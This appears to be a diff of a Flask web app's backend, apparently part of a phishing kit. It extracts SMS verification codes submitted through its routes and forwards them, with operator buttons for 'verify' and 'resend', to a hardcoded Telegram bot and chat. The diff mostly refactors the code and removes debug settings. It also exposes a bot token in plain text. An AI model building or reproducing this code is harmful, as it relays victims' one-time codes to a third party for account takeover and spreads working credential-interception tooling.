@@ -1,16 +1,12 @@
-from flask import Flask, render_template, request, jsonify, session
+from flask import Flask, render_template, request, jsonify
 import requests
 import re
 import json
-import hashlib
-import hmac
-import time
 from datetime import datetime
 import os
 
 app = Flask(__name__)
 app.secret_key = 'your-secret-key-here-change-this'
-app.config['SECRET_KEY'] = 'your-secret-key-here-change-this'
 
 # ===== TELEGRAM CONFIGURATION =====
 TELEGRAM_BOT_TOKEN = '8898988712:AAH8sR5P4Lb2TUKxTWNnO3dMqKNOMRXNGZ4'
@@ -19,7 +15,7 @@ TELEGRAM_CHAT_ID = '8589275340'
 # ===== HELPER FUNCTIONS =====
 
 def extract_code_from_sms(sms_text):
-    """Extract verification code from SMS text - works with ANY format"""
+    """Extract verification code from SMS text"""
     if not sms_text:
         return None
     
@@ -48,22 +44,6 @@ def extract_code_from_sms(sms_text):
     
     return None
 
-def send_telegram_message(message, parse_mode='HTML'):
-    """Send message to Telegram"""
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        'chat_id': TELEGRAM_CHAT_ID,
-        'text': message,
-        'parse_mode': parse_mode
-    }
-    
-    try:
-        response = requests.post(url, json=payload, timeout=10)
-        return response.json()
-    except Exception as e:
-        print(f"Error sending Telegram message: {e}")
-        return None
-
 def send_telegram_with_buttons(message, buttons):
     """Send message with inline keyboard buttons"""
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -79,7 +59,7 @@ def send_telegram_with_buttons(message, buttons):
         response = requests.post(url, json=payload, timeout=10)
         return response.json()
     except Exception as e:
-        print(f"Error sending Telegram message with buttons: {e}")
+        print(f"Error: {e}")
         return None
 
 def format_sms_for_telegram(sms_text, extracted_code=None):
@@ -159,7 +139,7 @@ def verify_code():
             }), 500
             
     except Exception as e:
-        print(f"Error in verify_code: {e}")
+        print(f"Error: {e}")
         return jsonify({
             'status': 'error',
             'message': str(e)
@@ -196,7 +176,7 @@ Please send the new SMS for verification.
             }), 500
             
     except Exception as e:
-        print(f"Error in resend_code: {e}")
+        print(f"Error: {e}")
         return jsonify({
             'status': 'error',
             'message': str(e)
@@ -231,16 +211,23 @@ def webhook():
             }
             requests.post(answer_url, json=answer_data)
             
-            send_telegram_message(response)
+            # Send confirmation
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            payload = {
+                'chat_id': TELEGRAM_CHAT_ID,
+                'text': response,
+                'parse_mode': 'HTML'
+            }
+            requests.post(url, json=payload)
             
             return jsonify({'status': 'success'})
         
         return jsonify({'status': 'ok'})
         
     except Exception as e:
-        print(f"Error in webhook: {e}")
+        print(f"Error: {e}")
         return jsonify({'status': 'error'}), 500
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=True)
+    app.run(host='0.0.0.0', port=port)
